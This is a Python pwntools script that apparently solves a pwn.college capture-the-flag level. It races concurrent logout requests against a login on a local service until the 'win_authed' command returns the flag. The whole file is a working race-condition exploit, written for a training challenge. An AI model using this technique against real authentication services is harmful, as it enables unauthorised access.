# Level8
import threading

import pwn

PROMPT = b"[*]"


def logout_thread(barrier: threading.Barrier) -> None:
    with pwn.remote("127.0.0.1", 1337, level="error") as io:
        io.recvuntil(PROMPT)
        barrier.wait()  # ready to send logout
        io.sendline(b"logout")
        io.recvuntil(PROMPT)
        barrier.wait()

def ctf() -> None:
    for count in range(1, 1000):
        print(f"Attempt {count}")
        with pwn.remote("127.0.0.1", 1337, level="error") as io:
            io.sendline(b"login")
            io.recvuntil(b"1")

            threads = 3
            barrier = threading.Barrier(threads)
            threads = [threading.Thread(target=logout_thread, args=(barrier,)) for _ in range(threads)]

            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()

            io.recvuntil(PROMPT)
            io.sendline(b"win_authed")
            data = io.recvuntil(PROMPT).decode(errors="ignore")
            if "pwn.college{" in data:
                print(data)
                return


if __name__ == "__main__":
    ctf()
